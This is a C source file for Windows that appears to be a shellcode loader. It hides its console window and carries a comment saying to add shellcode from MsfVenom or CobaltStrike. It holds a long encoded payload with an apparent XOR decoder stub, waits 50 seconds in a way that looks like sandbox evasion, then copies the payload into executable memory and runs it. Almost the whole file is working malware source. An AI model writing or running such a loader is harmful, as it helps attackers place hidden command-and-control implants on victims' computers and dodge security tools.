#include "stdio.h"
#include "windows.h"
//#include "iostream"

//using namespace std;


// Trying to set the size of console windows
/* int main (){ 
        HWND console = GetConsoleWindow();
        RECT ConsoleRect;
        GetWindowRect(console, &ConsoleRect);
              
    MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 60, 40, TRUE);
    
    system("pause");
    
    } */

int main(int argc, char *argv[]) {
::ShowWindow(::GetConsoleWindow(), SW_HIDE); 

        //HWND console = GetConsoleWindow();
        //RECT ConsoleRect;
       // GetWindowRect(console, &ConsoleRect);
              
    //MoveWindow(console, ConsoleRect.left, ConsoleRect.top, 60, 40, TRUE);
    
    //system("pause");


//Add shellcode from MsfVenom, CobaltStrike or others


unsigned char tripping[] = 
"\xfd\x27\x5b\x53\x5f\xb0\xf7\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\xa8\x4f"
"\x74\x07\x80\x3e\xf7\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x02\x17\x26\xf7\xe9\x30\x7d\x51\x48\x96\xfa\xeb\x88\x77"
"\xea\x71\x5b\x44\x78\x88\x11\x16\x05\x5f\xd9\xc5\x5f\xd9\xc4"
"\x71\xa7\x3d\x15\xaa\x76\x10\xa6\x3c\xef\x53\xe8\xfc\xc0\xfd"
"\xf6\xce\xd6\xe8\xd9\xfd\x0f\x28\xfa\xe4\x0f\x41\x4a\x61\xbc"
"\xba\xd4\xb4\x6c\xc3\x5b\x56\x7b\x44\x93\x38\x3c\x08\x60\xe5"
"\xde\x76\xf3\xc9\x4e\x9b\x26\xc1\xd0\x7b\x2f\x9a\x27\x8b\x79"
"\xe5\xc3\xfc\xe6\xdf\xe4\xdb\xd7\xe5\xe6\x30\x14\xba\xcd\x25"
"\x4c\x75\x5d\xa7\x66\xfe\xb9\x53\xff\x40\x7f\x51\x49\xac\x04"
"\x27\x21\x4a\xe8\xe1\x4a\xe8\xe0\x64\x96\x19\x71\x2d\x52\x05"
"\x97\x18\x42\x62\xcc\xe9\xf1\xd9\xe3\xff\xf2\xfd\xe8\xd9\x1a"
"\x19\x66\xf1\x3e\x65\x5f\x50\x98\x29\xe5\x90\x79\xf2\x7f\x43"
"\x4a\x60\x86\x09\x18\x1d\x51\xc1\xcb\x47\xd7\xdc\x7f\xbf\x33"
"\x65\x71\x6e\x1e\xbe\x32\x3c\x5d\xf0\xf2\xd8\xf3\xee\xc0\xce"
"\xe6\xc1\xf3\x01\x30\x29\xfc\x01\x59\x44\x79\xb2\x4c\xda\xac"
"\x62\xdb\x55\x4e\x75\x5c\x9d\x20\x32\x10\x6e\xfd\xd0\x6e\xfd"
"\xd1\x40\x83\x28\xfd\x58\x63\x21\x82\x29\x7d\x77\xfd\xcd\xe4"
"\xe8\xc7\xea\xc3\xd9\xfd\xe8\x3e\x04\x4c\xd5\x23\x54\x73\x45"
"\xa1\x17\xf8\xa1\x55\xe7\x46\x67\x57\x51\xaa\x1c\x21\x39\x4c"
"\xf0\xe7\x52\xee\xf8\x62\x8e\x1f\x61\x45\x4a\x03\x8f\x1e\x33"
"\x64\xd4\xef\xe9\xdf\xfb\xf9\xea\xfb\xf0\xdf\x12\x09\x17\xe7"
"\x30\x73\x51\x46\x96\xd0\xeb\x86\x77\xe4\x71\x55\x44\x76\x88"
"\x1f\x16\x0b\x5f\xd7\xc5\x51\xd9\xca\x71\xa9\x3d\x56\x62\x78"
"\x10\xa8\x3c\xc5\x53\xe6\xfc\xce\xfd\xf8\xce\xd8\xe8\xd7\xfd"
"\x01\xfa\xff\x28\x6b\x49\x5e\x8e\xdc\xf3\x9e\x6f\xfc\x69\x4d"
"\x5c\x6e\x90\x07\x0e\x13\x47\xcf\xdd\x49\xc1\xd2\x69\xb1\x25"
"\x2b\xde\x60\x08\xb0\x24\xc9\x4b\xfe\xe4\xd6\xe5\xe0\xd6\xc0"
"\xf0\xcf\xe5\x22\xf6\xdc\x0b\x48\x6a\x7d\xad\xae\xd0\xbd\x4c"
"\xdf\x4a\x6e\x7f\x4d\xb3\x24\x2d\x30\x64\xec\xfe\x6a\xe2\xf1"
"\x4a\x92\x06\xd8\x3c\x43\x2b\x93\x07\xbb\x68\xdd\xc7\xf5\xc6"
"\xc3\xf5\xe3\xd3\xec\xc6\x36\x84\xdf\x70\x84\xc9\xc6\xe1\xe3"
"\x38\x07\x2d\x77\x58\x62\x68\x55\x7c\x60\x41\x12\xea\x62\x65"
"\xbd\x5b\x43\x70\x8c\x7f\x2e\x41\xa8\x6a\x27\x65\xbd\x7b\x73"
"\x70\x08\x9a\x7c\x43\x6e\x09\xce\x65\x07\xc9\x8f\x04\x66\x51"
"\x34\x25\x03\x79\xc6\xe4\x3b\x48\x22\xf9\xe5\xc0\x64\x48\x72"
"\x70\x8c\x7f\x16\x82\x61\x04\x4f\x2c\xe6\x82\xa3\xb0\x07\x2d"
"\x36\x41\xa6\xf8\x73\x4a\x7e\x08\xf3\x68\x8c\x65\x2e\x4d\xa8"
"\x78\x27\x64\x37\xd9\xc0\x6e\x4f\xd2\xff\x48\xa8\x0c\x8f\x65"
"\x37\xdf\x6e\x09\xce\x65\x07\xc9\x8f\x79\xc6\xe4\x3b\x48\x22"
"\xf9\x3f\xcd\x43\xf8\x6f\x3b\x4b\x09\x3e\x4c\x1a\xe9\x72\xf5"
"\x6e\x4d\xa8\x78\x23\x64\x37\xd9\x45\x79\x8c\x21\x7e\x4d\xa8"
"\x78\x1b\x64\x37\xd9\x62\xb3\x03\xa5\x7e\x08\xf3\x79\x5f\x6c"
"\x6e\x57\x7a\x62\x46\x75\x77\x50\x62\x62\x4f\xae\xda\x29\x62"
"\x6a\xf8\xcd\x6e\x48\x7a\x62\x4f\xa6\x24\xe0\x74\xc7\xf8\xd2"
"\x6b\x40\x9d\x4f\x74\x1f\x69\x3a\x11\x38\x07\x6c\x60\x40\xaa"
"\xde\x4f\xac\xda\xa9\x22\x38\x07\x64\xbf\xec\x6a\x84\x05\x2d"
"\x37\xb2\x29\x2e\x84\x3d\x77\x5d\x6a\xb1\xe3\x61\xbf\xf8\x62"
"\x82\x4b\x5a\x10\x0e\xdc\xed\x4b\xa4\xdc\x61\x22\x39\x07\x2d"
"\x6f\x48\x99\x11\x87\x46\x36\xf6\xf6\x68\x57\x60\x07\xc0\x6e"
"\x09\xc7\x65\xc9\xc9\x6b\xb1\xc5\x65\xc9\xc9\x6b\xb1\xc6\x6c"
"\x8c\xe3\x2c\xe7\xe7\xd2\xe3\x41\xaa\xff\x6d\x3d\x77\x51\x6f"
"\xb1\xe5\x65\xbf\xf0\x62\x82\x9e\x88\x42\x68\xdc\xed\x4f\xac"
"\xf2\x49\x21\x38\x07\x64\x8e\x6a\x4e\x5c\x07\x2d\x36\x09\x23"
"\x79\x57\x6c\x66\x41\xaa\xda\x50\x7a\x61\x44\x12\xf8\x6d\x20"
"\x6f\x48\x73\xda\xfb\x4b\xf1\x4d\x07\x6c\x06\x2c\x7e\x84\x67"
"\x1c\x1f\xeb\x36\x61\x6b\xb1\xe1\x7b\x66\x48\x73\x79\x57\x6c"
"\x66\x40\xdc\xf8\x46\x7d\x7f\xf6\xeb\x75\x8e\xec\x7a\x80\xe2"
"\x79\xbd\x54\xfa\x36\xa5\xc7\xd2\x65\x07\xdb\x6b\xc7\xcd\xa6"
"\x38\x48\x99\x30\x80\x30\x56\xf6\xf6\x83\xf7\x98\x94\x5f\x62"
"\x82\xa1\xb8\x8b\x94\xdc\xed\x4f\xae\xf2\x21\x1f\x3e\x7b\x27"
"\xb6\xf2\xc3\x4d\x02\x96\x71\x1a\x51\x57\x6d\x2d\x6f\x48\xaa"
"\xe2\xf8\xf8\xd8\x3c\x3e\xef\x67\x46\x6a\x6a\xd9\x4d\x42\x43"
"\x64\x1c\xf3\xd3\x24\x8e\xa8\x4f";

	char first[] = "\xeb";
	void *exec = VirtualAlloc(0, sizeof tripping, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	        while(true){
	        Sleep(50000);
	memcpy(tripping, first, 1);
	memcpy(exec, tripping, sizeof tripping);
	((void(*)())exec)();

	return 0;
	}
}

